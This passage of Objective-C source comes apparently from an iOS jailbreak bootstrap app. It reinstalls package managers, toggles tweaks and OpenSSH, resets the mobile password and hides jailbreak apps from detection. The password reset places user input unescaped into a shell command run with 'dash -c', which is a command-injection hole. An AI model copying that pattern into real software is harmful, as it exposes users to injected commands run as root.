        [AppDelegate showHudMsg:Localized(@"Applying")];

        NSString* log=nil;
        NSString* err=nil;

        BOOL success=YES;

        [AppDelegate addLogText:Localized(@"Status: Reinstalling Sileo")];
        NSString* sileoDeb = [NSBundle.mainBundle.bundlePath stringByAppendingPathComponent:@"sileo.deb"];
        if(spawnBootstrap((char*[]){"/usr/bin/dpkg", "-i", rootfsPrefix(sileoDeb).fileSystemRepresentation, NULL}, &log, &err) != 0) {
            [AppDelegate addLogText:[NSString stringWithFormat:@"failed:%@\nERR:%@", log, err]];
            success = NO;
        }

        if(spawnBootstrap((char*[]){"/usr/bin/uicache", "-p", "/Applications/Sileo.app", NULL}, &log, &err) != 0) {
            [AppDelegate addLogText:[NSString stringWithFormat:@"failed:%@\nERR:%@", log, err]];
            success = NO;
        }

        [AppDelegate addLogText:Localized(@"Status: Reinstalling Zebra")];
        NSString* zebraDeb = [NSBundle.mainBundle.bundlePath stringByAppendingPathComponent:@"zebra.deb"];
        if(spawnBootstrap((char*[]){"/usr/bin/dpkg", "-i", rootfsPrefix(zebraDeb).fileSystemRepresentation, NULL}, nil, nil) != 0) {
            [AppDelegate addLogText:[NSString stringWithFormat:@"failed:%@\nERR:%@", log, err]];
            success = NO;
        }

        if(spawnBootstrap((char*[]){"/usr/bin/uicache", "-p", "/Applications/Zebra.app", NULL}, &log, &err) != 0) {
            [AppDelegate addLogText:[NSString stringWithFormat:@"failed:%@\nERR:%@", log, err]];
            success = NO;
        }

        if(success) {
            [AppDelegate showMesage:Localized(@"Sileo and Zebra reinstalled!") title:@""];
        }
        [AppDelegate dismissHud];
    });
}

int rebuildIconCache()
{
    AppInfo* tsapp = [AppInfo appWithBundleIdentifier:@"com.opa334.TrollStore"];
    if(!tsapp) {
        STRAPLOG("trollstore not found!");
        return -1;
    }

    STRAPLOG("rebuild icon cache...");
    ASSERT([LSApplicationWorkspace.defaultWorkspace _LSPrivateRebuildApplicationDatabasesForSystemApps:YES internal:YES user:YES]);

    NSString* log=nil;
    NSString* err=nil;

    if(spawnRoot([tsapp.bundleURL.path stringByAppendingPathComponent:@"trollstorehelper"], @[@"refresh"], &log, &err) != 0) {
        STRAPLOG("refresh tsapps failed:%@\nERR:%@", log, err);
        return -1;
    }

    [[NSString new] writeToFile:jbroot(@"/basebin/.rebuildiconcache") atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [LSApplicationWorkspace.defaultWorkspace openApplicationWithBundleID:NSBundle.mainBundle.bundleIdentifier];

    int status = spawnBootstrap((char*[]){"/bin/sh", "/basebin/rebuildapps.sh", NULL}, &log, &err);
    if(status==0) {
        killAllForExecutable("/usr/libexec/backboardd");
    } else {
        STRAPLOG("rebuildapps failed:%@\nERR:\n%@",log,err);
    }

    if([NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/basebin/.rebuildiconcache")]) {
        [NSFileManager.defaultManager removeItemAtPath:jbroot(@"/basebin/.rebuildiconcache") error:nil];
    }

    return status;
}

void rebuildIconCacheAction()
{
    [AppDelegate addLogText:Localized(@"Status: Rebuilding Icon Cache")];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        setIdleTimerDisabled(YES);
        [AppDelegate showHudMsg:Localized(@"Rebuilding") detail:Localized(@"Don't exit Bootstrap app until show the lock screen")];

        NSString* log=nil;
        NSString* err=nil;
        int status = spawnRoot(NSBundle.mainBundle.executablePath, @[@"rebuildiconcache"], &log, &err);
        if(status != 0) {
            [AppDelegate showMesage:[NSString stringWithFormat:@"%@\n\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"code(%d)",status]];
        }

        [AppDelegate dismissHud];
        setIdleTimerDisabled(NO);
    });
}

void tweaEnableAction(BOOL enable)
{
    gTweakEnabled = enable;
    
    if(!isBootstrapInstalled()) return;

    if(enable) {
        ASSERT([[NSString new] writeToFile:jbroot(@"/var/mobile/.tweakenabled") atomically:YES encoding:NSUTF8StringEncoding error:nil]);
    } else if([NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/var/mobile/.tweakenabled")]) {
        ASSERT([NSFileManager.defaultManager removeItemAtPath:jbroot(@"/var/mobile/.tweakenabled") error:nil]);
    }
}

void URLSchemesToggle(BOOL enable)
{
    if(enable) {
        ASSERT([[NSString new] writeToFile:jbroot(@"/var/mobile/.allow_url_schemes") atomically:YES encoding:NSUTF8StringEncoding error:nil]);
    } else if([NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/var/mobile/.allow_url_schemes")]) {
        ASSERT([NSFileManager.defaultManager removeItemAtPath:jbroot(@"/var/mobile/.allow_url_schemes") error:nil]);
    }
    
    rebuildappsAction();
}

void URLSchemesAction(BOOL enable)
{
    if(!isSystemBootstrapped()) return;
    
    if(!enable) {
        URLSchemesToggle(enable);
        return;
    }
    
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Warning") message:Localized(@"Enabling URL Schemes may result in jailbreak detection. Are you sure you want to continue?") preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"NO") style:UIAlertActionStyleDefault handler:^(UIAlertAction *action){
        [NSNotificationCenter.defaultCenter postNotificationName:@"URLSchemesCancelNotification" object:nil];
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"YES") style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        URLSchemesToggle(enable);
    }]];
    [AppDelegate showAlert:alert];
}

BOOL opensshAction(BOOL enable)
{
    if(!isSystemBootstrapped()) {
        [NSUserDefaults.appDefaults setValue:@(enable) forKey:@"openssh"];
        [NSUserDefaults.appDefaults synchronize];
        return enable;
    }
    
    if([NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/basebin/.launchctl_support")]) {
        return NO;
    }

    if(![NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/usr/libexec/sshd-keygen-wrapper")]) {
        [AppDelegate showMesage:Localized(@"openssh package is not installed") title:Localized(@"Developer")];
        return NO;
    }

    NSString* log=nil;
    NSString* err=nil;
    int status = spawnRoot(jbroot(@"/basebin/bootstrapd"), @[@"openssh",enable?@"start":@"stop"], &log, &err);

    //try
    if(!enable) spawnBootstrap((char*[]){"/usr/bin/killall","-9","sshd",NULL}, nil, nil);

    if(status==0)
    {
        [NSUserDefaults.appDefaults setValue:@(enable) forKey:@"openssh"];
        [NSUserDefaults.appDefaults synchronize];
    }
    else
    {
        [AppDelegate showMesage:[NSString stringWithFormat:@"%@\n\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"code(%d)",status]];
        return NO;
    }
    
    return enable;
}


void bootstrapAction()
{
    if(isSystemBootstrapped())
    {
        ASSERT(checkBootstrapVersion()==false);

        UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Update") message:Localized(@"The current bootstrapped version is inconsistent with the Bootstrap app version, and you need to reboot the device to update it.") preferredStyle:UIAlertControllerStyleAlert];

        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Cancel") style:UIAlertActionStyleDefault handler:nil]];
        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Reboot Device") style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
            ASSERT(spawnRoot(NSBundle.mainBundle.executablePath, @[@"reboot"], nil, nil)==0);
        }]];

        [AppDelegate showAlert:alert];
        return;
    }

    if(!checkTSVersion()) {
        [AppDelegate showMesage:Localized(@"Your trollstore version is too old, Bootstrap only supports trollstore>=2.0, you have to update your trollstore then reinstall Bootstrap app.") title:Localized(@"Error")];
        return;
    }

    if(spawnRoot([NSBundle.mainBundle.bundlePath stringByAppendingPathComponent:@"basebin/devtest"], nil, nil, nil) != 0) {
        [AppDelegate showMesage:Localized(@"Your device does not seem to have developer mode enabled.\n\nPlease enable developer mode and reboot your device.") title:Localized(@"Error")];
        return;
    }
    
    NSString* launchdpath = getLaunchdPath();
    if(![launchdpath isEqualToString:@"/sbin/launchd"] && ![launchdpath hasPrefix:@"/private/var/containers/Bundle/Application/.jbroot-"])
    {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Error") message:Localized(@"Please reboot device first.") preferredStyle:UIAlertControllerStyleAlert];

        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Cancel") style:UIAlertActionStyleDefault handler:nil]];
        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Reboot Device") style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
            ASSERT(spawnRoot(NSBundle.mainBundle.executablePath, @[@"reboot"], nil, nil)==0);
        }]];

        [AppDelegate showAlert:alert];
        return;
    }

    UIImpactFeedbackGenerator* generator = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleSoft];
    [generator impactOccurred];

    int installedCount=0;
    NSString* dirpath = @"/var/containers/Bundle/Application/";
    NSArray *subItems = [NSFileManager.defaultManager contentsOfDirectoryAtPath:dirpath error:nil];
    for (NSString *subItem in subItems)
    {
        if (!is_jbroot_name(subItem.UTF8String)) continue;
        
        NSString* jbroot_path = [dirpath stringByAppendingPathComponent:subItem];
        
        if([NSFileManager.defaultManager fileExistsAtPath:[jbroot_path stringByAppendingPathComponent:@"/.installed_dopamine"]]) {
            [AppDelegate showMesage:Localized(@"roothide dopamine has been installed on this device, now install this bootstrap may break it!") title:Localized(@"Error")];
            return;
        }
        
        if([NSFileManager.defaultManager fileExistsAtPath:[jbroot_path stringByAppendingPathComponent:@"/.bootstrapped"]]
           || [NSFileManager.defaultManager fileExistsAtPath:[jbroot_path stringByAppendingPathComponent:@"/.thebootstrapped"]]) {
            installedCount++;
            continue;
        }
    }

    if(installedCount > 1) {
        [AppDelegate showMesage:Localized(@"There are multi jbroot in /var/containers/Bundle/Applicaton/") title:Localized(@"Error")];
        return;
    }

    if(find_jbroot(YES)) //make sure jbroot() function available
    {
        //check beta version
        if([NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/.bootstrapped")]) {
            NSString* strappedVersion = [NSString stringWithContentsOfFile:jbroot(@"/.bootstrapped") encoding:NSUTF8StringEncoding error:nil];
            if(strappedVersion.intValue != BOOTSTRAP_VERSION) {
                [AppDelegate showMesage:Localized(@"You have installed an old beta version, please disable all app tweaks and reboot the device to uninstall it so that you can install the new version bootstrap.") title:Localized(@"Error")];
                return;
            }
        }
    }

    [AppDelegate showHudMsg:Localized(@"Bootstrapping")];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        setIdleTimerDisabled(YES);

        const char* argv[] = {NSBundle.mainBundle.executablePath.fileSystemRepresentation, "bootstrap", NULL};
        int status = spawn(argv[0], argv, environ, ^(char* outstr, int length){
            NSString *str = [[NSString alloc] initWithBytes:outstr length:length encoding:NSASCIIStringEncoding];
            [AppDelegate addLogText:str];
        }, ^(char* errstr, int length){
            NSString *str = [[NSString alloc] initWithBytes:errstr length:length encoding:NSASCIIStringEncoding];
            [AppDelegate addLogText:[NSString stringWithFormat:@"ERR: %@\n",str]];
        });

        [AppDelegate dismissHud];
        setIdleTimerDisabled(NO);

        if(status != 0)
        {
            [AppDelegate showMesage:@"" title:[NSString stringWithFormat:@"code(%d)",status]];
            return;
        }

        NSString* log=nil;
        NSString* err=nil;

        if([NSUserDefaults.appDefaults boolForKey:@"openssh"] && [NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/usr/libexec/sshd-keygen-wrapper")])
        {
            NSString* log=nil;
            NSString* err=nil;
             status = spawnRoot(jbroot(@"/basebin/bootstrapd"), @[@"openssh",@"start"], &log, &err);
            if(status==0)
                [AppDelegate addLogText:Localized(@"openssh launch successful")];
            else
                [AppDelegate addLogText:[NSString stringWithFormat:@"openssh launch faild(%d):\n%@\n%@", status, log, err]];
        }

        if(gTweakEnabled && ![NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/var/mobile/.tweakenabled")]) {
            ASSERT([[NSString new] writeToFile:jbroot(@"/var/mobile/.tweakenabled") atomically:YES encoding:NSUTF8StringEncoding error:nil]);
        }
        
        if(![NSFileManager.defaultManager fileExistsAtPath:jbroot(@"/var/mobile/.preferences_tweak_inited")])
        {
            [AppDelegate addLogText:Localized(@"Enable Tweak Injection for com.apple.Preferences")];
            
            NSString* log=nil;
            NSString* err=nil;
            status = spawnRoot(NSBundle.mainBundle.executablePath, @[@"enableapp",@"/Applications/Preferences.app"], &log, &err);
            
            if(status == 0) {
                ASSERT([[NSString new] writeToFile:jbroot(@"/var/mobile/.preferences_tweak_inited") atomically:YES encoding:NSUTF8StringEncoding error:nil]);
            } else {
                [AppDelegate showMesage:[NSString stringWithFormat:@"%@\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"error(%d)",status]];
                return;
            }
        }

        [generator impactOccurred];
        [AppDelegate addLogText:Localized(@"respring now...")]; sleep(1);

         status = spawnBootstrap((char*[]){"/usr/bin/sbreload", NULL}, &log, &err);
        if(status!=0) [AppDelegate showMesage:[NSString stringWithFormat:@"%@\n\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"code(%d)",status]];

    });
}


void unbootstrapAction()
{
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Warning") message:Localized(@"Are you sure to uninstall bootstrap?\n\nPlease make sure you have disabled tweak for all apps before uninstalling.") preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Cancel") style:UIAlertActionStyleDefault handler:nil]];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Uninstall") style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action){

        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            [AppDelegate showHudMsg:Localized(@"Uninstalling")];
            setIdleTimerDisabled(YES);

            NSString* log=nil;
            NSString* err=nil;
            int status = spawnRoot(NSBundle.mainBundle.executablePath, @[@"unbootstrap"], &log, &err);

            [AppDelegate dismissHud];
            setIdleTimerDisabled(NO);

            NSString* msg = (status==0) ? Localized(@"bootstrap uninstalled") : [NSString stringWithFormat:@"code(%d)\n%@\n\nstderr:\n%@",status,log,err];

            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"" message:msg preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:Localized(@"OK") style:UIAlertActionStyleDefault handler:^(UIAlertAction *action){
                exit(0);
            }]];

            [AppDelegate showAlert:alert];

        });

    }]];
    [AppDelegate showAlert:alert];
}

void resetMobilePassword()
{
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Reset Mobile Password") message:Localized(@"Set the mobile password of your device, this can also be used for root access using sudo. If you want to set the root password, you can do so from a mobile shell using \"sudo passwd root\"") preferredStyle:UIAlertControllerStyleAlert];
    
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
    }];
    
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Cancel") style:UIAlertActionStyleDefault handler:nil]];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Confirm") style:UIAlertActionStyleDefault handler:^(UIAlertAction *action){
        
        NSString* log=nil;
        NSString* err=nil;
        NSString* pwcmd = [NSString stringWithFormat:@"printf \"%%s\\n\" \"%@\" | /usr/sbin/pw usermod 501 -h 0", alert.textFields.lastObject.text];
        const char* args[] = {"/usr/bin/dash", "-c", pwcmd.UTF8String, NULL};
        int status = spawnBootstrap(args, &log, &err);
        if(status == 0 || status == 67) {
            [AppDelegate showMesage:Localized(@"done") title:@""];
        } else {
            [AppDelegate showMesage:[NSString stringWithFormat:@"%@\n\nstderr:\n%@",log,err] title:[NSString stringWithFormat:@"code(%d)",status]];
        }

    }]];
    [AppDelegate showAlert:alert];
}

void hideAllCTBugApps()
{
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Warning") message:Localized(@"This operation will make all apps installed via TrollStore/Bootstrap disappear from the Home Screen. You can restore them later via TrollStore Helper->[Refresh App Registrations] and Bootstrap->Settings->[Unhide Jailbreak Apps]") preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Cancel") style:UIAlertActionStyleDefault handler:nil]];
    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"Hide") style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action){

        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            [AppDelegate showHudMsg:Localized(@"Hiding All Jailbreak/TrollStore Apps...")];
            
            NSArray* allInstalledApplications = [LSApplicationWorkspace.defaultWorkspace allInstalledApplications];
            
            BOOL TSHelperFound = NO;
            for(LSApplicationProxy* proxy in allInstalledApplications) {
                NSString* TSHelperMarker = [proxy.bundleURL.path stringByAppendingPathComponent:@".TrollStorePersistenceHelper"];
                if([NSFileManager.defaultManager fileExistsAtPath:TSHelperMarker]) {
                    TSHelperFound = YES;
                    break;
                }
            }
            
            if(!TSHelperFound) {
                [AppDelegate dismissHud];
                
                UIAlertController *alert = [UIAlertController alertControllerWithTitle:Localized(@"Error") message:Localized(@"You haven't installed TrollStore Helper yet, please install it in TrollStore->Settings first.") preferredStyle:UIAlertControllerStyleAlert];
                [alert addAction:[UIAlertAction actionWithTitle:Localized(@"OK") style:UIAlertActionStyleDefault handler:nil]];
                [AppDelegate showAlert:alert];
                
                return;
            }
            
            for(LSApplicationProxy* proxy in allInstalledApplications)
            {
                if([NSFileManager.defaultManager fileExistsAtPath:[proxy.bundleURL.path stringByAppendingString:@"/../_TrollStore"]])
                {
                    if([proxy.bundleIdentifier isEqualToString:NSBundle.mainBundle.bundleIdentifier]) {
                        continue;
                    }
                    
                    NSString* log=nil;
                    NSString* err=nil;
                    int status = spawnBootstrap((char*[]){"/usr/bin/uicache","-u",rootfsPrefix(proxy.bundleURL.path).fileSystemRepresentation,NULL}, &log, &err);
                    if(status != 0) {
                        [AppDelegate dismissHud];
                        
                        NSString* msg = [NSString stringWithFormat:@"code(%d)\n%@\n\nstderr:\n%@",status,log,err];
                        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"" message:msg preferredStyle:UIAlertControllerStyleAlert];
                        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"OK") style:UIAlertActionStyleDefault handler:nil]];
                        [AppDelegate showAlert:alert];
                        
                        return;
                    }
                }
            }
            
            for(NSString* bundle in [NSFileManager.defaultManager directoryContentsAtPath:jbroot(@"/Applications")])
            {
                NSString* bundlePath = [@"/Applications" stringByAppendingPathComponent:bundle];
                NSDictionary* appInfo = [NSDictionary dictionaryWithContentsOfFile:[bundlePath stringByAppendingPathComponent:@"Info.plist"]];
                
                if([appInfo[@"CFBundleIdentifier"] hasPrefix:@"com.apple."] && [NSFileManager.defaultManager fileExistsAtPath:bundlePath]) {
                    continue;
                }
                
                NSString* log=nil;
                NSString* err=nil;
                int status = spawnBootstrap((char*[]){"/usr/bin/uicache","-u",bundlePath.fileSystemRepresentation,NULL}, &log, &err);
                if(status != 0) {
                    [AppDelegate dismissHud];
                    
                    NSString* msg = [NSString stringWithFormat:@"code(%d)\n%@\n\nstderr:\n%@",status,log,err];
                    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"" message:msg preferredStyle:UIAlertControllerStyleAlert];
                    [alert addAction:[UIAlertAction actionWithTitle:Localized(@"OK") style:UIAlertActionStyleDefault handler:nil]];
                    [AppDelegate showAlert:alert];
                    
                    return;
                }
            }

            [AppDelegate dismissHud];
            
            [[NSString stringWithFormat:@"%llX",jbrand()] writeToFile:jbroot(@"/var/mobile/.allctbugappshidden") atomically:YES encoding:NSUTF8StringEncoding error:nil];
            
            NSString* log=nil;
            NSString* err=nil;
            int status = spawnBootstrap((char*[]){"/usr/bin/uicache","-u",rootfsPrefix(NSBundle.mainBundle.bundlePath).fileSystemRepresentation,NULL}, &log, &err);
            if(status != 0) {
                NSString* msg = [NSString stringWithFormat:@"code(%d)\n%@\n\nstderr:\n%@",status,log,err];
                UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"" message:msg preferredStyle:UIAlertControllerStyleAlert];
                [alert addAction:[UIAlertAction actionWithTitle:Localized(@"OK") style:UIAlertActionStyleDefault handler:nil]];
                [AppDelegate showAlert:alert];
            } else {
                exit(0);
            }
        });

    }]];
    [AppDelegate showAlert:alert];
}

void unhideAllCTBugApps()
{
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [AppDelegate showHudMsg:Localized(@"Restore Jailbreak Apps...")];
        
        NSString* log=nil;
        NSString* err=nil;
        int status = spawnBootstrap((char*[]){"/usr/bin/uicache","-a",NULL}, &log, &err);
        
        [AppDelegate dismissHud];
        
        NSString* msg = (status==0) ? Localized(@"Done") : [NSString stringWithFormat:@"code(%d)\n%@\n\nstderr:\n%@",status,log,err];
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"" message:msg preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:Localized(@"OK") style:UIAlertActionStyleDefault handler:nil]];
        [AppDelegate showAlert:alert];
        
        [NSFileManager.defaultManager removeItemAtPath:jbroot(@"/var/mobile/.allctbugappshidden") error:nil];
    });
}

BOOL isAllCTBugAppsHidden()
{
    if(!isBootstrapInstalled() || !isSystemBootstrapped()) {
        return NO;
    }
    
    NSString* flag = [NSString stringWithContentsOfFile:jbroot(@"/var/mobile/.allctbugappshidden") encoding:NSUTF8StringEncoding error:nil];
    return flag && [flag isEqualToString:[NSString stringWithFormat:@"%llX",jbrand()]];
}
